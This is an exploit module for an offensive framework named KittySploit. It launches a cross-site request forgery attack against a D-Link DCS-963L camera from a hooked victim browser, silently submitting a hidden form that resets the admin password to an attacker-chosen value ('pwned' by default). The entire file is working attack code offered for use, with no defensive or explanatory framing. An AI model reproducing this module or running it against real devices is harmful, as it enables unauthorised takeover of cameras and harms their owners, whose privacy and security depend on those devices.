from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link DCS-963L CSRF",
		"description": "D-Link DCS-963L camera - Change admin password via CSRF POST",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target camera URL (with http://)", required=True)
	username = OptString("admin", "Username to change password for", required=True)
	password = OptString("pwned", "New password to set", required=True)

	def run(self):
		
		form_data = [
			f'<form method="POST" action="{self.target}/eng/admin/tools_admin.cgi">',
			f'<input type="hidden" name="user" value="{self.username}">',
			f'<input type="hidden" name="action" value="set">',
			f'<input type="hidden" name="password" value="{self.password}">',
			f'<input type="hidden" name="confirmPassword" value="{self.password}">',
			f'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/eng/admin/tools_admin.cgi")
		print_info(f"Username: {self.username}")
		print_info(f"New password: {self.password}")
		

		js_code = self.csrf_post_and_submit(form_data)
		
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"Password change request sent for user: {self.username}")
			print_info(f"New password: {self.password}")
			return True
		else:
			print_error("Failed to execute CSRF POST attack or timeout waiting for response")
			fail.CSRFPostFailed()
		return False